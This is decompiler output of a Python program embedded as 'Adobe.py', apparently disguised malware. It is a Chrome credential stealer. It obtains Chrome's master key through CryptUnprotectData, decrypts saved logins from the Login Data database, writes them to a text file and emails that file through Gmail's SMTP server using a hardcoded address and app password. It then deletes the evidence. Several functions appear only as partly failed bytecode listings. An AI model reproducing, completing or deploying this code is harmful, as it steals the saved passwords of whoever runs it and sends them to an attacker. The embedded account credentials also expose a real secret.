# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Jun 29 2021, 19:54:56) 
# [GCC 8.3.0]
# Embedded file name: Adobe.py
import os, json, base64, sqlite3, win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib, time
keys = []
count = 0
keylogfil = 'kylog.txt'
toadd = 'keystroke1212@gmail.com'
fromadd = 'keystroke1212@gmail.com'
password = 'briqywlabxosnwav'
passwordfile = 'pass.txt'

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key--- This code section failed: ---

 L.  43         0  LOAD_GLOBAL              os
                2  LOAD_ATTR                path
                4  LOAD_METHOD              join
                6  LOAD_GLOBAL              os
                8  LOAD_ATTR                environ
               10  LOAD_STR                 'USERPROFILE'
               12  BINARY_SUBSCR    

 L.  44        14  LOAD_STR                 'AppData'
               16  LOAD_STR                 'Local'
               18  LOAD_STR                 'Google'
               20  LOAD_STR                 'Chrome'

 L.  45        22  LOAD_STR                 'User Data'
               24  LOAD_STR                 'Local State'

 L.  43        26  CALL_METHOD_7         7  ''
               28  STORE_FAST               'local_state_path'

 L.  46        30  LOAD_GLOBAL              open
               32  LOAD_FAST                'local_state_path'
               34  LOAD_STR                 'r'
               36  LOAD_STR                 'utf-8'
               38  LOAD_CONST               ('encoding',)
               40  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               42  SETUP_WITH           78  'to 78'
               44  STORE_FAST               'f'

 L.  47        46  LOAD_FAST                'f'
               48  LOAD_METHOD              read
               50  CALL_METHOD_0         0  ''
               52  STORE_FAST               'local_state'

 L.  48        54  LOAD_GLOBAL              json
               56  LOAD_METHOD              loads
               58  LOAD_FAST                'local_state'
               60  CALL_METHOD_1         1  ''
               62  STORE_FAST               'local_state'
               64  POP_BLOCK        
               66  LOAD_CONST               None
               68  DUP_TOP          
               70  DUP_TOP          
               72  CALL_FUNCTION_3       3  ''
               74  POP_TOP          
               76  JUMP_FORWARD         94  'to 94'
             78_0  COME_FROM_WITH       42  '42'
               78  <49>             
               80  POP_JUMP_IF_TRUE     84  'to 84'
               82  <48>             
             84_0  COME_FROM            80  '80'
               84  POP_TOP          
               86  POP_TOP          
               88  POP_TOP          
               90  POP_EXCEPT       
               92  POP_TOP          
             94_0  COME_FROM            76  '76'

 L.  51        94  LOAD_GLOBAL              base64
               96  LOAD_METHOD              b64decode
               98  LOAD_FAST                'local_state'
              100  LOAD_STR                 'os_crypt'
              102  BINARY_SUBSCR    
              104  LOAD_STR                 'encrypted_key'
              106  BINARY_SUBSCR    
              108  CALL_METHOD_1         1  ''
              110  STORE_FAST               'key'

 L.  53       112  LOAD_FAST                'key'
              114  LOAD_CONST               5
              116  LOAD_CONST               None
              118  BUILD_SLICE_2         2 
              120  BINARY_SUBSCR    
              122  STORE_FAST               'key'

 L.  57       124  LOAD_GLOBAL              win32crypt
              126  LOAD_METHOD              CryptUnprotectData
              128  LOAD_FAST                'key'
              130  LOAD_CONST               None
              132  LOAD_CONST               None
              134  LOAD_CONST               None
              136  LOAD_CONST               0
              138  CALL_METHOD_5         5  ''
              140  LOAD_CONST               1
              142  BINARY_SUBSCR    
              144  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `DUP_TOP' instruction at offset 68


def decrypt_password--- This code section failed: ---

 L.  60         0  SETUP_FINALLY        66  'to 66'

 L.  62         2  LOAD_FAST                'password'
                4  LOAD_CONST               3
                6  LOAD_CONST               15
                8  BUILD_SLICE_2         2 
               10  BINARY_SUBSCR    
               12  STORE_FAST               'iv'

 L.  63        14  LOAD_FAST                'password'
               16  LOAD_CONST               15
               18  LOAD_CONST               None
               20  BUILD_SLICE_2         2 
               22  BINARY_SUBSCR    
               24  STORE_FAST               'password'

 L.  65        26  LOAD_GLOBAL              AES
               28  LOAD_METHOD              new
               30  LOAD_FAST                'key'
               32  LOAD_GLOBAL              AES
               34  LOAD_ATTR                MODE_GCM
               36  LOAD_FAST                'iv'
               38  CALL_METHOD_3         3  ''
               40  STORE_FAST               'cipher'

 L.  67        42  LOAD_FAST                'cipher'
               44  LOAD_METHOD              decrypt
               46  LOAD_FAST                'password'
               48  CALL_METHOD_1         1  ''
               50  LOAD_CONST               None
               52  LOAD_CONST               -16
               54  BUILD_SLICE_2         2 
               56  BINARY_SUBSCR    
               58  LOAD_METHOD              decode
               60  CALL_METHOD_0         0  ''
               62  POP_BLOCK        
               64  RETURN_VALUE     
             66_0  COME_FROM_FINALLY     0  '0'

 L.  68        66  POP_TOP          
               68  POP_TOP          
               70  POP_TOP          

 L.  69        72  SETUP_FINALLY       106  'to 106'

 L.  70        74  LOAD_GLOBAL              str
               76  LOAD_GLOBAL              win32crypt
               78  LOAD_METHOD              CryptUnprotectData
               80  LOAD_FAST                'password'
               82  LOAD_CONST               None
               84  LOAD_CONST               None
               86  LOAD_CONST               None
               88  LOAD_CONST               0
               90  CALL_METHOD_5         5  ''
               92  LOAD_CONST               1
               94  BINARY_SUBSCR    
               96  CALL_FUNCTION_1       1  ''
               98  POP_BLOCK        
              100  ROT_FOUR         
              102  POP_EXCEPT       
              104  RETURN_VALUE     
            106_0  COME_FROM_FINALLY    72  '72'

 L.  71       106  POP_TOP          
              108  POP_TOP          
              110  POP_TOP          

 L.  73       112  POP_EXCEPT       
              114  POP_EXCEPT       
              116  LOAD_STR                 ''
              118  RETURN_VALUE     
              120  <48>             
              122  POP_EXCEPT       
              124  JUMP_FORWARD        128  'to 128'
              126  <48>             
            128_0  COME_FROM           124  '124'

Parse error at or near `SETUP_FINALLY' instruction at offset 72


def main--- This code section failed: ---

 L.  78         0  LOAD_GLOBAL              get_encryption_key
                2  CALL_FUNCTION_0       0  ''
                4  STORE_FAST               'key'

 L.  81         6  LOAD_GLOBAL              os
                8  LOAD_ATTR                path
               10  LOAD_METHOD              join
               12  LOAD_GLOBAL              os
               14  LOAD_ATTR                environ
               16  LOAD_STR                 'USERPROFILE'
               18  BINARY_SUBSCR    
               20  LOAD_STR                 'AppData'
               22  LOAD_STR                 'Local'

 L.  82        24  LOAD_STR                 'Google'
               26  LOAD_STR                 'Chrome'
               28  LOAD_STR                 'User Data'
               30  LOAD_STR                 'default'
               32  LOAD_STR                 'Login Data'

 L.  81        34  CALL_METHOD_8         8  ''
               36  STORE_FAST               'db_path'

 L.  85        38  LOAD_STR                 'ChromeData.db'
               40  STORE_FAST               'filename'

 L.  86        42  LOAD_GLOBAL              shutil
               44  LOAD_METHOD              copyfile
               46  LOAD_FAST                'db_path'
               48  LOAD_FAST                'filename'
               50  CALL_METHOD_2         2  ''
               52  POP_TOP          

 L.  88        54  LOAD_GLOBAL              sqlite3
               56  LOAD_METHOD              connect
               58  LOAD_FAST                'filename'
               60  CALL_METHOD_1         1  ''
               62  STORE_FAST               'db'

 L.  89        64  LOAD_FAST                'db'
               66  LOAD_METHOD              cursor
               68  CALL_METHOD_0         0  ''
               70  STORE_FAST               'cursor'

 L.  91        72  LOAD_FAST                'cursor'
               74  LOAD_METHOD              execute
               76  LOAD_STR                 'SELECT origin_url, action_url, username_value, password_value, date_created FROM logins'
               78  CALL_METHOD_1         1  ''
               80  POP_TOP          

 L.  93        82  LOAD_FAST                'cursor'
               84  LOAD_METHOD              fetchall
               86  CALL_METHOD_0         0  ''
               88  GET_ITER         
             90_0  COME_FROM           274  '274'
             90_1  COME_FROM           272  '272'
             90_2  COME_FROM           270  '270'
             90_3  COME_FROM           138  '138'
               90  FOR_ITER            276  'to 276'
               92  STORE_FAST               'row'

 L.  94        94  LOAD_FAST                'row'
               96  LOAD_CONST               0
               98  BINARY_SUBSCR    
              100  STORE_FAST               'origin_url'

 L.  95       102  LOAD_FAST                'row'
              104  LOAD_CONST               1
              106  BINARY_SUBSCR    
              108  STORE_FAST               'action_url'

 L.  96       110  LOAD_FAST                'row'
              112  LOAD_CONST               2
              114  BINARY_SUBSCR    
              116  STORE_FAST               'username'

 L.  97       118  LOAD_GLOBAL              decrypt_password
              120  LOAD_FAST                'row'
              122  LOAD_CONST               3
              124  BINARY_SUBSCR    
              126  LOAD_FAST                'key'
              128  CALL_FUNCTION_2       2  ''
              130  STORE_FAST               'password'

 L. 100       132  LOAD_FAST                'username'
              134  POP_JUMP_IF_TRUE    140  'to 140'
              136  LOAD_FAST                'password'
              138  POP_JUMP_IF_FALSE_BACK    90  'to 90'
            140_0  COME_FROM           134  '134'

 L. 101       140  LOAD_GLOBAL              os
              142  LOAD_METHOD              getcwd
              144  CALL_METHOD_0         0  ''
              146  STORE_FAST               'directory'

 L. 103       148  LOAD_GLOBAL              os
              150  LOAD_ATTR                path
              152  LOAD_METHOD              join
              154  LOAD_FAST                'directory'
              156  LOAD_GLOBAL              passwordfile
              158  CALL_METHOD_2         2  ''
              160  STORE_GLOBAL             fileename

 L. 104       162  LOAD_GLOBAL              open
              164  LOAD_GLOBAL              fileename
              166  LOAD_STR                 'a'
              168  CALL_FUNCTION_2       2  ''
              170  SETUP_WITH          252  'to 252'
              172  STORE_FAST               'f'

 L. 105       174  LOAD_FAST                'f'
              176  LOAD_METHOD              write
              178  LOAD_STR                 '\n'
              180  LOAD_FAST                'origin_url'
              182  BINARY_ADD       
              184  CALL_METHOD_1         1  ''
              186  POP_TOP          

 L. 106       188  LOAD_FAST                'f'
              190  LOAD_METHOD              write
              192  LOAD_STR                 '\n'
              194  LOAD_FAST                'action_url'
              196  BINARY_ADD       
              198  CALL_METHOD_1         1  ''
              200  POP_TOP          

 L. 107       202  LOAD_FAST                'f'
              204  LOAD_METHOD              write
              206  LOAD_STR                 '\n'
              208  LOAD_FAST                'username'
              210  BINARY_ADD       
              212  CALL_METHOD_1         1  ''
              214  POP_TOP          

 L. 108       216  LOAD_FAST                'f'
              218  LOAD_METHOD              write
              220  LOAD_STR                 '\n'
              222  LOAD_FAST                'password'
              224  BINARY_ADD       
              226  CALL_METHOD_1         1  ''
              228  POP_TOP          

 L. 109       230  LOAD_FAST                'f'
              232  LOAD_METHOD              close
              234  CALL_METHOD_0         0  ''
              236  POP_TOP          
              238  POP_BLOCK        
              240  LOAD_CONST               None
              242  DUP_TOP          
              244  DUP_TOP          
              246  CALL_FUNCTION_3       3  ''
              248  POP_TOP          
              250  JUMP_FORWARD        270  'to 270'
            252_0  COME_FROM_WITH      170  '170'
              252  <49>             
          254_256  POP_JUMP_IF_TRUE    260  'to 260'
              258  <48>             
            260_0  COME_FROM           254  '254'
              260  POP_TOP          
              262  POP_TOP          
              264  POP_TOP          
              266  POP_EXCEPT       
              268  POP_TOP          
            270_0  COME_FROM           250  '250'
              270  CONTINUE             90  'to 90'

 L. 115       272  CONTINUE             90  'to 90'
              274  JUMP_BACK            90  'to 90'
            276_0  COME_FROM            90  '90'

 L. 121       276  LOAD_FAST                'cursor'
              278  LOAD_METHOD              close
              280  CALL_METHOD_0         0  ''
              282  POP_TOP          

 L. 122       284  LOAD_FAST                'db'
              286  LOAD_METHOD              close
              288  CALL_METHOD_0         0  ''
              290  POP_TOP          

 L. 124       292  SETUP_FINALLY       308  'to 308'

 L. 126       294  LOAD_GLOBAL              os
              296  LOAD_METHOD              remove
              298  LOAD_FAST                'filename'
              300  CALL_METHOD_1         1  ''
              302  POP_TOP          
              304  POP_BLOCK        
              306  JUMP_FORWARD        320  'to 320'
            308_0  COME_FROM_FINALLY   292  '292'

 L. 127       308  POP_TOP          
              310  POP_TOP          
              312  POP_TOP          

 L. 128       314  POP_EXCEPT       
              316  JUMP_FORWARD        320  'to 320'
              318  <48>             
            320_0  COME_FROM           316  '316'
            320_1  COME_FROM           306  '306'

Parse error at or near `DUP_TOP' instruction at offset 242


if __name__ == '__main__':
    main()

def send_mail--- This code section failed: ---

 L. 135         0  LOAD_GLOBAL              MIMEMultipart
                2  CALL_FUNCTION_0       0  ''
                4  STORE_FAST               'mg'

 L. 136         6  LOAD_FAST                'toadd'
                8  LOAD_FAST                'mg'
               10  LOAD_STR                 'To'
               12  STORE_SUBSCR     

 L. 137        14  LOAD_FAST                'toadd'
               16  LOAD_FAST                'mg'
               18  LOAD_STR                 'From'
               20  STORE_SUBSCR     

 L. 138        22  LOAD_STR                 'keyloging files '
               24  LOAD_FAST                'mg'
               26  LOAD_STR                 'Subject'
               28  STORE_SUBSCR     

 L. 139        30  LOAD_STR                 'body of the keys'
               32  STORE_FAST               'body'

 L. 140        34  LOAD_FAST                'mg'
               36  LOAD_METHOD              attach
               38  LOAD_GLOBAL              MIMEText
               40  LOAD_FAST                'body'
               42  LOAD_STR                 'plain'
               44  CALL_FUNCTION_2       2  ''
               46  CALL_METHOD_1         1  ''
               48  POP_TOP          

 L. 141        50  LOAD_FAST                'filname'
               52  STORE_FAST               'filname'

 L. 143        54  LOAD_GLOBAL              open
               56  LOAD_FAST                'attachment'
               58  LOAD_STR                 'rb'
               60  CALL_FUNCTION_2       2  ''
               62  STORE_FAST               'attachment'

 L. 144        64  LOAD_GLOBAL              MIMEBase
               66  LOAD_STR                 'application'
               68  LOAD_STR                 'octet-stream'
               70  CALL_FUNCTION_2       2  ''
               72  STORE_FAST               'p'

 L. 145        74  LOAD_FAST                'p'
               76  LOAD_METHOD              set_payload
               78  LOAD_FAST                'attachment'
               80  LOAD_METHOD              read
               82  CALL_METHOD_0         0  ''
               84  CALL_METHOD_1         1  ''
               86  POP_TOP          

 L. 146        88  LOAD_GLOBAL              encoders
               90  LOAD_METHOD              encode_base64
               92  LOAD_FAST                'p'
               94  CALL_METHOD_1         1  ''
               96  POP_TOP          

 L. 147        98  LOAD_FAST                'p'
              100  LOAD_METHOD              add_header
              102  LOAD_STR                 'Content-Disposition'
              104  LOAD_STR                 'attachment; filename= %s'
              106  LOAD_FAST                'filname'
              108  BINARY_MODULO    
              110  CALL_METHOD_2         2  ''
              112  POP_TOP          

 L. 148       114  LOAD_FAST                'mg'
              116  LOAD_METHOD              attach
              118  LOAD_FAST                'p'
              120  CALL_METHOD_1         1  ''
              122  POP_TOP          

 L. 149       124  SETUP_FINALLY       192  'to 192'

 L. 150       126  LOAD_GLOBAL              smtplib
              128  LOAD_METHOD              SMTP
              130  LOAD_STR                 'smtp.gmail.com'
              132  LOAD_CONST               587
              134  CALL_METHOD_2         2  ''
              136  STORE_FAST               's'

 L. 151       138  LOAD_FAST                's'
              140  LOAD_METHOD              starttls
              142  CALL_METHOD_0         0  ''
              144  POP_TOP          

 L. 153       146  LOAD_FAST                's'
              148  LOAD_METHOD              login
              150  LOAD_FAST                'toadd'
              152  LOAD_GLOBAL              password
              154  CALL_METHOD_2         2  ''
              156  POP_TOP          

 L. 155       158  LOAD_FAST                'mg'
              160  LOAD_METHOD              as_string
              162  CALL_METHOD_0         0  ''
              164  STORE_FAST               'text'

 L. 156       166  LOAD_FAST                's'
              168  LOAD_METHOD              sendmail
              170  LOAD_FAST                'toadd'
              172  LOAD_GLOBAL              fromadd
              174  LOAD_FAST                'text'
              176  CALL_METHOD_3         3  ''
              178  POP_TOP          

 L. 157       180  LOAD_FAST                's'
              182  LOAD_METHOD              quit
              184  CALL_METHOD_0         0  ''
              186  POP_TOP          
              188  POP_BLOCK        
              190  JUMP_FORWARD        226  'to 226'
            192_0  COME_FROM_FINALLY   124  '124'

 L. 158       192  POP_TOP          
              194  POP_TOP          
              196  POP_TOP          

 L. 159       198  LOAD_GLOBAL              time
              200  LOAD_METHOD              sleep
              202  LOAD_CONST               20
              204  CALL_METHOD_1         1  ''
              206  POP_TOP          

 L. 160       208  LOAD_GLOBAL              send_mail
              210  LOAD_GLOBAL              passwordfile
              212  LOAD_GLOBAL              fileename
              214  LOAD_FAST                'toadd'
              216  CALL_FUNCTION_3       3  ''
              218  POP_TOP          

 L. 161       220  POP_EXCEPT       
              222  JUMP_FORWARD        226  'to 226'
              224  <48>             
            226_0  COME_FROM           222  '222'
            226_1  COME_FROM           190  '190'

Parse error at or near `<48>' instruction at offset 224


send_mail(passwordfile, fileename, toadd)
os.remove(passwordfile)